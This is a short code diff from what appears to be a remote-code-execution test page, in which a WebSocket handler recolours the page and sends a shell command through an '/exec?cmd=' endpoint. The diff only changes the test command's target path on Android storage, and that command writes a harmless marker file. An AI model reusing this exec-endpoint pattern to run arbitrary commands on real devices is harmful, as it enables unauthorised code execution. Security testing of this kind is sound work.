@@ -20,8 +20,8 @@ ws.onmessage = (event) => {
     // Visible RCE Command: Change background color
     document.body.style.backgroundColor = "red";
 
-    // Simulate creating a file in a visible location (accessible to most apps)
-    const simulatedCommand = "echo 'RCE Test Success' > /storage/emulated/0/RCE_Test_Success.txt";
+    // Command to create the file in "Internal storage/Folder 1"
+    const simulatedCommand = "echo 'RCE Test Success' > /storage/emulated/0/Folder 1/rce.txt";
 
     fetch(`/exec?cmd=${encodeURIComponent(simulatedCommand)}`)
       .then((response) => response.text())
